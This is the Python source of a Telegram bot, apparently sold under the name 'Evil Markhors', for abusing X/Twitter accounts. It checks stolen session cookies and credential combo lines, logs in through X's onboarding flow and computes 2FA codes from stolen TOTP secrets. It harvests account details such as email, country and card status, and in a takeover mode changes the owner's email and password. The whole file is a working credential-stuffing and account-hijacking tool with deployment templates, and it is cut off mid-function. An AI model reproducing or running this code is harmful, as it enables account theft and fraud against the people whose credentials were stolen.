#!/usr/bin/env python3
"""
Evil Markhors Bot - HARDENED
Live progress + crash-proof + auto-recovery.
"""
import os, re, sys, json, stat, hmac, time, base64, struct, secrets, string
import asyncio, logging, tempfile, zipfile, shutil, traceback

try:
    import httpx
    from telegram import Update, InputFile
    from telegram.error import RetryAfter, Forbidden, BadRequest
    from telegram.ext import (ApplicationBuilder, CommandHandler,
                              MessageHandler, filters, ContextTypes)
except ImportError:
    print("Deps missing: pip install -r requirements.txt"); raise

# ============================ CONFIG ============================
BOT_TOKEN    = os.getenv("BOT_TOKEN", "PASTE_YOUR_BOT_TOKEN")
WEBSITE      = os.getenv("WEBSITE", "https://evilmarkhors.me")
CREDIT       = os.getenv("CREDIT", "Config by Evil Markhors")
LIVE_DEFAULT = os.getenv("LIVE", "1") == "1"
CONCURRENCY  = int(os.getenv("CONCURRENCY", "8"))
TIMEOUT      = float(os.getenv("TIMEOUT", "25"))
ACC_TIMEOUT  = float(os.getenv("ACC_TIMEOUT", "90"))     # per account max seconds
MAX_FILES    = int(os.getenv("MAX_FILES", "5000"))
RETRIES      = int(os.getenv("RETRIES", "3"))
STORE_PATH   = os.getenv("STORE_PATH", "users.json")
HERE         = os.path.dirname(os.path.abspath(__file__))
SELF         = os.path.basename(os.path.abspath(__file__))

BEARER = ("AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs"
          "%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA")
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

FIELDS = ["Username","ID","Followers","Friends","Posts","Likes","Media","Verified",
          "Verified type","Suspended","Protected","Country","Year","Created","Email",
          "Phone","2FA","Card added","API","Developer API"]
_FIELD_RE = re.compile(r"^\s*[\u2013\-]\s*([^:]+?)\s*:\s*(.*)$")

# ============================ DEPLOY TEMPLATES ============================
FILES = {
 "requirements.txt": "python-telegram-bot>=21.0\nhttpx>=0.27\n",
 ".gitignore": "__pycache__/\n*.pyc\n.env\nusers.json\ndata/\nvenv/\n*.zip\nbatch_*.json\n",
 ".dockerignore": "venv\n__pycache__\n*.zip\n.env\ndata\nusers.json\n",
 ".env.example": ("BOT_TOKEN=123456:ABC\nLIVE=1\nCONCURRENCY=8\n"
                  "WEBSITE=https://evilmarkhors.me\nCREDIT=Config by Evil Markhors\nSTORE_PATH=users.json\n"),
 "Dockerfile": ("FROM python:3.12-slim\nWORKDIR /app\nENV PYTHONUNBUFFERED=1 STORE_PATH=/app/users.json\n"
                "COPY requirements.txt .\nRUN pip install --no-cache-dir -r requirements.txt\n"
                f"COPY {SELF} bot.py\nCMD [\"python\",\"bot.py\"]\n"),
 "railway.toml": '[build]\nbuilder = "DOCKERFILE"\ndockerfilePath = "Dockerfile"\n\n'
                 '[deploy]\nrestartPolicyType = "ON_FAILURE"\nrestartPolicyMaxRetries = 10\n',
 "README.md": f"# Evil Markhors Bot\n\nCookie + ULP reworker.\n\n```\npython {SELF}\n```\n",
}

def _w(p, c, ov=False):
    f = os.path.join(HERE, p)
    if os.path.exists(f) and not ov: return False
    with open(f, "w", encoding="utf-8") as fh: fh.write(c)
    if p.endswith(".sh"): os.chmod(f, os.stat(f).st_mode | stat.S_IEXEC)
    return True

def bootstrap(force=False):
    return [n for n, c in FILES.items() if _w(n, c, force)]

# ============================ STATE ============================
_store, _lock = {}, asyncio.Lock()
BATCH = {}     # uid -> batch dict
PEND  = {}     # uid -> {key: state}

def load_store():
    global _store
    try:
        with open(os.path.join(HERE, STORE_PATH), encoding="utf-8") as f: _store = json.load(f)
    except Exception: _store = {}

def save_store():
    try:
        p = os.path.join(HERE, STORE_PATH)
        with open(p + ".tmp", "w", encoding="utf-8") as f: json.dump(_store, f, indent=2)
        os.replace(p + ".tmp", p)
    except Exception: logging.exception("store")

def ucfg(uid):
    return _store.setdefault(str(uid), {"live": LIVE_DEFAULT, "mode": "auto",
                                        "takeover": False, "newpass": "", "newemail": ""})

def get_live(uid): return bool(ucfg(uid).get("live", LIVE_DEFAULT))

async def set_cfg(uid, **kw):
    async with _lock:
        ucfg(uid).update(kw); save_store()

# ---------- batch persistence (crash recovery) ----------
def batch_file(uid): return os.path.join(HERE, f"batch_{uid}.json")

def save_batch(uid):
    b = BATCH.get(uid)
    if not b: return
    try:
        with open(batch_file(uid), "w", encoding="utf-8") as f:
            json.dump({"lines": b["lines"], "results": b["results"], "ok": b["ok"],
                       "fail": b["fail"], "mode": b["mode"], "started": b["started"]}, f)
    except Exception: logging.exception("save_batch")

def clear_batch_file(uid):
    try: os.remove(batch_file(uid))
    except Exception: pass

def load_batches():
    for fn in os.listdir(HERE):
        if fn.startswith("batch_") and fn.endswith(".json"):
            try:
                uid = fn[6:-5]
                with open(os.path.join(HERE, fn), encoding="utf-8") as f: d = json.load(f)
                if d.get("lines"):
                    BATCH[uid] = {"tmp": tempfile.mkdtemp(prefix="em_rec_"), "msg": None,
                                  "lines": d["lines"], "results": d.get("results", []),
                                  "ok": d.get("ok", 0), "fail": d.get("fail", 0),
                                  "mode": d.get("mode", "ulp"), "takeover": False,
                                  "newpass": "", "newemail": "", "started": d.get("started", time.time())}
                    logging.info("recovered batch for %s (%s lines)", uid, len(d["lines"]))
            except Exception: logging.exception("load_batch %s", fn)

# ============================ PROGRESS ============================
def _fmt_t(sec):
    sec = int(sec)
    return f"{sec//60}m{sec%60:02d}s" if sec >= 60 else f"{sec}s"

class Progress:
    def __init__(self, msg, total, label):
        self.msg, self.total, self.label = msg, total, label
        self.done = self.ok = self.fail = self.pend = 0
        self.start = time.time(); self.last = 0.0; self.lock = asyncio.Lock()
        self.phase = "start"
    async def update(self, phase=None, force=False):
        if phase: self.phase = phase
        async with self.lock:
            now = time.time()
            if not force and now - self.last < 2.5: return
            self.last = now
            el = now - self.start
            pct = int(self.done * 100 / self.total) if self.total else 0
            eta = (el / self.done * (self.total - self.done)) if self.done else 0
            bar = "█" * (pct // 5) + "░" * (20 - pct // 5)
            await _edit(self.msg,
                f"{self.label}\n{self.phase}\n\n{bar} {pct}%\n"
                f"{self.done}/{self.total} | ok {self.ok} | fail {self.fail} | code {self.pend}\n"
                f"waqt {_fmt_t(el)} | baaqi ~{_fmt_t(eta)}")

async def _edit(msg, text):
    if msg is None: return
    for _ in range(3):
        try:
            await msg.edit_text(text); return
        except RetryAfter as e:
            await asyncio.sleep(getattr(e, "retry_after", 2))
        except Exception:
            return

# ============================ COOKIE MODE ============================
def parse_cookie_file(text):
    data, cookies = {}, []
    for line in text.splitlines():
        m = _FIELD_RE.match(line)
        if m: data[m.group(1).strip()] = m.group(2).strip()
        elif "\t" in line and not line.lstrip().startswith("#"): cookies.append(line)
    return data, cookies

def cookie_dict(lines):
    d = {}
    for l in lines:
        p = l.split("\t")
        if len(p) >= 7: d[p[5]] = p[6]
    return d

def build_cookie_file(data, cookies):
    out = ["Valid Cookie  /  Every day!", WEBSITE, CREDIT, ""]
    for f in FIELDS:
        v = data.get(f)
        out.append(f"\u2013 {f}: {v if v not in (None, '') else '\u2013'}")
    out.append(f"\u2013 Cookies: {CREDIT}"); out.append(""); out.extend(cookies)
    return "\n".join(out).rstrip() + "\n"

def hdrs(ck):
    return {"Authorization": f"Bearer {BEARER}", "x-csrf-token": ck.get("ct0", ""),
            "x-twitter-active-user": "yes",
            "x-twitter-auth-type": "OAuth2Session" if ck.get("auth_token") else "",
            "x-twitter-client-language": "en", "User-Agent": UA, "Accept": "application/json"}

async def get_json(client, ck, url):
    d = 1.0
    for _ in range(RETRIES):
        try:
            r = await client.get(url, headers=hdrs(ck), cookies=ck, timeout=TIMEOUT)
            if r.status_code in (429,500,502,503): await asyncio.sleep(d); d*=2; continue
            return r.json() if r.status_code == 200 else None
        except Exception: await asyncio.sleep(d); d*=2
    return None

def _yr(s):
    m = re.search(r"(19|20)\d{2}", s or ""); return m.group(0) if m else ""

async def live_check(client, ck):
    d = {}
    j = await get_json(client, ck, "https://api.x.com/1.1/account/verify_credentials.json"
        "?include_entities=false&skip_status=true&include_email=true")
    if j:
        d.update({"Username": j.get("screen_name",""), "ID": j.get("id_str",""),
                  "Followers": j.get("followers_count",""), "Friends": j.get("friends_count",""),
                  "Posts": j.get("statuses_count",""), "Likes": j.get("favourites_count",""),
                  "Media": j.get("media_count",""), "Verified": str(bool(j.get("verified"))).lower(),
                  "Verified type": j.get("verified_type") or "", "Suspended": "false",
                  "Protected": str(bool(j.get("protected"))).lower(), "Email": j.get("email","")})
        if j.get("created_at"):
            d["Created"] = j["created_at"]
            if _yr(j["created_at"]): d["Year"] = _yr(j["created_at"])
    s = await get_json(client, ck, "https://api.x.com/1.1/account/settings.json")
    if s and s.get("country_code"): d["Country"] = s["country_code"]
    pm = await get_json(client, ck, "https://api.x.com/1.1/account/payment_methods.json")
    if isinstance(pm, dict) and "cards" in pm: d["Card added"] = "Yes" if pm.get("cards") else "No"
    fs = await get_json(client, ck, "https://api.x.com/1.1/account/feature_switches.json")
    if isinstance(fs, dict):
        if "has_api_access" in fs: d["API"] = str(bool(fs["has_api_access"])).lower()
        if "developer_api" in fs: d["Developer API"] = str(bool(fs["developer_api"])).lower()
    return d

async def rework_cookie(text, client, live, sem):
    data, cookies = parse_cookie_file(text)
    if live and cookies:
        async with sem:
            try:
                ld = await asyncio.wait_for(live_check(client, cookie_dict(cookies)), ACC_TIMEOUT)
            except asyncio.TimeoutError:
                ld = {}
        for k, v in ld.items():
            if v not in ("", None): data[k] = str(v)
    data["Cookies"] = CREDIT
    return build_cookie_file(data, cookies)

# ============================ ULP MODULE ============================
ONB = "https://api.twitter.com/1.1/onboarding/task.json"

def totp_now(sec):
    sec = sec.strip().replace(" ", "").upper()
    key = base64.b32decode(sec + "=" * ((8 - len(sec) % 8) % 8))
    h = hmac.new(key, struct.pack(">Q", int(time.time()) // 30), hashlib.sha1).digest()
    o = h[19] & 15
    return f"{(struct.unpack('>I', h[o:o+4])[0] & 0x7fffffff) % 1000000:06d}"

def parse_ulp(line):
    parts = [p.strip() for p in line.strip().split(":") if p.strip()]
    if not parts: return None
    email = next((p for p in parts if "@" in p), "")
    totp = ""
    for p in list(parts):
        if p != email and re.fullmatch(r"[A-Z2-7]{16,32}", p): totp = p; parts.remove(p); break
    rest = [p for p in parts if p != email]
    if len(rest) >= 2: username, password = rest[0], rest[1]
    elif len(rest) == 1: username, password = "", rest[0]
    else: return None
    if not password: return None
    return {"username": username, "email": email, "password": password, "totp": totp}

def gen_pass():
    return "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(13)) + "!x7"

def alias_email(base, username):
    local, _, domain = base.partition("@")
    return f"{local}+{username or 'x'}@{domain}" if domain else base

def _H(cl):
    return {"authorization": f"Bearer {BEARER}", "content-type": "application/json",
            "user-agent": UA, "x-twitter-active-user": "yes", "x-twitter-client-language": "en",
            "x-csrf-token": cl.cookies.get("ct0", ""),
            "x-guest-token": cl.cookies.get("guest_token", ""),
            "x-twitter-auth-type": "OAuth2Client" if cl.cookies.get("auth_token") else ""}

async def _task(cl, payload, start=False):
    r = await cl.post(ONB, params={"flow_name": "login"} if start else None,
                      json=payload, headers=_H(cl), timeout=TIMEOUT)
    try: return r.json()
    except Exception: return {}

async def _send(cl, ft, subtask, value):
    return await _task(cl, {"flow_token": ft, "subtask_inputs": [
        {"subtask_id": subtask, "enter_text": {"text": value, "link": "next_link"}}]})

async def _duplication(cl, ft):
    return await _task(cl, {"flow_token": ft, "subtask_inputs": [
        {"subtask_id": "AccountDuplicationCheck",
         "check_logged_in_account": {"link": "AccountDuplicationCheck_false"}}]})

def _logged_in(cl): return bool(cl.cookies.get("auth_token") and cl.cookies.get("ct0"))

async def ulp_login(ulp):
    cl = httpx.AsyncClient(follow_redirects=True)
    try:
        r = await cl.post("https://api.twitter.com/1.1/guest/activate.json", headers=_H(cl), timeout=TIMEOUT)
        cl.cookies.set("guest_token", r.json().get("guest_token", ""))
        j = await _task(cl, {"input_flow_data": {"flow_context": {"debug_overrides": {},
              "start_location": {"location": "splash_screen"}}}, "subtask_versions": {}}, start=True)
        ft = j.get("flow_token")
        if not ft: return cl, False, {}
        j = await _task(cl, {"flow_token": ft, "subtask_inputs": [{"subtask_id": "LoginJsInstrumentationSubtask",
              "js_instrumentation": {"response": "{}", "link": "next_link"}}]}); ft = j.get("flow_token", ft)
        j = await _task(cl, {"flow_token": ft, "subtask_inputs": [{"subtask_id": "LoginEnterUserIdentifierSSO",
              "settings_list": {"setting_responses": [{"key": "user_identifier",
              "response_data": {"text_data": {"result": ulp["username"] or ulp["email"]}}}],
              "link": "next_link"}}]}); ft = j.get("flow_token", ft)
        j = await _task(cl, {"flow_token": ft, "subtask_inputs": [{"subtask_id": "LoginEnterPassword",
              "enter_password": {"password": ulp["password"], "link": "next_link"}}]}); ft = j.get("flow_token", ft)
        subs = [s.get("subtask_id", "") for s in j.get("subtasks", [])]
        if "LoginTwoFactorAuthChallenge" in subs and ulp.get("totp"):
            j = await _send(cl, ft, "LoginTwoFactorAuthChallenge", totp_now(ulp["totp"])); ft = j.get("flow_token", ft)
            subs = [s.get("subtask_id", "") for s in j.get("subtasks", [])]
        for s in subs:
            if s in ("LoginAcid", "LoginTwoFactorAuthChallenge"):
                return cl, False, {"pending": s, "flow_token": ft}
        if "AccountDuplicationCheck" in subs: j = await _duplication(cl, ft)
        return cl, _logged_in(cl), {}
    except Exception:
        logging.exception("ulp_login"); return cl, False, {}

async def resume_login(st, code):
    cl, ft = st["client"], st["flow_token"]
    j = await _send(cl, ft, st["subtask"], code); ft = j.get("flow_token", ft)
    subs = [s.get("subtask_id", "") for s in j.get("subtasks", [])]
    for s in subs:
        if s in ("LoginAcid", "LoginTwoFactorAuthChallenge"):
            st["subtask"], st["flow_token"] = s, ft; return "more"
    if "AccountDuplicationCheck" in subs: j = await _duplication(cl, ft)
    return "ok" if _logged_in(cl) else "fail"

EMAIL_SET = ["https://x.com/i/api/1.1/account/update_email.json",
             "https://api.x.com/1.1/account/update_email.json"]
EMAIL_CFM = ["https://x.com/i/api/1.1/account/confirm_email.json",
             "https://api.x.com/1.1/account/verify_email.json"]

async def set_email(cl, ck, new_email):
    for url in EMAIL_SET:
        try:
            r = await cl.post(url, headers={**hdrs(ck), "content-type": "application/x-www-form-urlencoded"},
                              cookies=ck, data={"email": new_email}, timeout=TIMEOUT)
            if r.status_code == 200: return True
        except Exception: pass
    return False

async def confirm_email(cl, ck, code):
    for url in EMAIL_CFM:
        for field in ("confirmation_code", "code"):
            try:
                r = await cl.post(url, headers={**hdrs(ck), "content-type": "application/x-www-form-urlencoded"},
                                  cookies=ck, data={field: code}, timeout=TIMEOUT)
                if r.status_code == 200: return True
            except Exception: pass
    return False

async def change_pass(cl, ck, old, new):
    try:
        r = await cl.post("https://twitter.com/i/api/i/account/change_password.json",
            headers={**hdrs(ck), "content-type": "application/x-www-form-urlencoded"}, cookies=ck,
            data={"current_password": old, "password": new, "password_confirmation": new}, timeout=TIMEOUT)
        return r.status_code == 200
    except Exception: return False

async def finish_account(uid, idx, ulp, cl):
    b = BATCH[uid]; ck = dict(cl.cookies)
    try:
        det = await asyncio.wait_for(live_check(cl, ck), ACC_TIMEOUT)
    except asyncio.TimeoutError:
        det = {}
    res = {"ok": True, "ulp": ulp, "details": det, "line": b["lines"][idx]}
    if b["takeover"] and b["newemail"]:
        ne = alias_email(b["newemail"], det.get("Username") or ulp["username"])
        try:
            if await asyncio.wait_for(set_email(cl, ck, ne), ACC_TIMEOUT): res["new_email"] = ne
        except asyncio.TimeoutError: pass
        if res.get("new_email"):
            b["results"][idx] = res
            PEND.setdefault(uid, {})[str(idx)] = {"kind": "email", "client": cl,
                "ulp": ulp, "idx": idx, "new_email": ne}
            return "email_pending"
    if b["takeover"]:
        np = b["newpass"] or gen_pass()
        try:
            if await asyncio.wait_for(change_pass(cl, ck, ulp["password"], np), ACC_TIMEOUT): res["new_pass"] = np
        except asyncio.TimeoutError: pass
    b["results"][idx] = res; b["ok"] += 1
    await cl.aclose(); return "done"

def fmt_result(r):
    if not r: return ""
    if not r.get("ok"):
        return f"== FAIL ==\n{r.get('line','')}\nError: {r.get('err','')}\n"
    u, d = r["ulp"], r["details"]
    o = ["Login: OK", f"Username: {d.get('Username','')}", f"ID: {d.get('ID','')}",
         f"Email: {d.get('Email','') or u.get('email','')}", f"Password: {u['password']}",
         f"2FA: {u.get('totp','') or '\u2013'}"]
    if r.get("new_pass"): o.append(f"New password: {r['new_pass']}")
    if r.get("new_email"): o.append(f"New email: {r['new_email']}")
    if r.get("pending"): o.append(f"STATUS: {r['pending']}")
    for k in ("Followers","Friends","Posts","Likes","Media","Verified","Verified type",
              "Suspended","Protected","Country","Year","Created","Phone","Card added","API","Developer API"):
        o.append(f"{k}: {d.get(k,'') or '\u2013'}")
    return "\n".join(o + [CREDIT, WEBSITE, ""])

# ============================ RUNNERS ============================
async def process_cookie_zip(ip, op, live, prog):
    sem = asyncio.Semaphore(CONCURRENCY)
    async with httpx.AsyncClient(follow_redirects=True) as client:
        with zipfile.ZipFile(ip) as zin:
            names = [n for n in zin.namelist() if n.lower().endswith(".txt") and not n.endswith("/")][:MAX_FILES]
            prog.total = len(names)
            with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as zout:
                for name in names:
                    raw = b""
                    try:
                        raw = zin.read(name)
                        zout.writestr(name, await rework_cookie(raw.decode("utf-8","ignore"), client, live, sem))
                        prog.ok += 1
                    except Exception:
                        logging.exception("cookie %s", name)
                        try: zout.writestr(name, raw)
                        except Exception: pass
                        prog.fail += 1
                    prog.done += 1
                    await prog.update()
    return prog.ok, prog.fail, prog.total

async def run_ulp_batch(uid, lines, prog):
    b = BATCH[uid]
    b["lines"] = lines; b["results"] = [None] * len(lines); prog.total = len(lines)
    sem = asyncio.Semaphore(CONCURRENCY)
    async def one(idx, line):
        try:
            ulp = parse_ulp(line)
            if not ulp:
                b["results"][idx] = {"ok": False, "line": line, "err": "parse"}; prog.fail += 1
                return
